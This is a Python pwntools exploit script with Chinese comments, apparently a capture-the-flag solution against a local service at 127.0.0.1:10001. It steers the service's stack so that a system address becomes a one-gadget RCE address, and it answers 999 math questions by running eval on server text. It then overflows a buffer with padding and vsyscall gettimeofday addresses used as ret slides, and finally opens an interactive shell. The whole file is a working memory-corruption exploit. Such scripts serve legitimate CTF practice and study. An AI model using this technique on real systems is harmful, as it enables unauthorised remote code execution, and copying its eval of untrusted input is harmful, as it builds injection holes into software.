#!/usr/bin/python
#coding:utf-8

from pwn import * 

io = remote('127.0.0.1', 10001)

libc_base = -0x456a0					#减去system函数离libc开头的偏移
one_gadget_base = 0x45526				#加上one gadget rce离libc开头的偏移
vsyscall_gettimeofday = 0xffffffffff600000

def answer():
	io.recvuntil('Question: ') 
	answer = eval(io.recvuntil(' = ')[:-3])
	io.recvuntil('Answer:')
	io.sendline(str(answer))

io.recvuntil('Choice:')
io.sendline('2')						#让system的地址进入栈中
io.recvuntil('Choice:')
io.sendline('1')						#调用go()
io.recvuntil('How many levels?')
io.sendline('-1')						#输入的值必须小于0，防止覆盖掉system的地址
io.recvuntil('Any more?')

io.sendline(str(libc_base+one_gadget_base))		#第二次输入关卡的时候输入偏移值，从而通过相加将system的地址变为one gadget rce的地址
for i in range(999): 							#循环答题
	log.info(i)
	answer()

io.recvuntil('Question: ')

io.send('a'*0x38 + p64(vsyscall_gettimeofday)*3) 	#最后一次回答，通过padding和三个vsyscall中的系统调用执行到one gadget RCE，其中三个vsyscall充当了ret的角色，思想类似于NOP slide
io.interactive()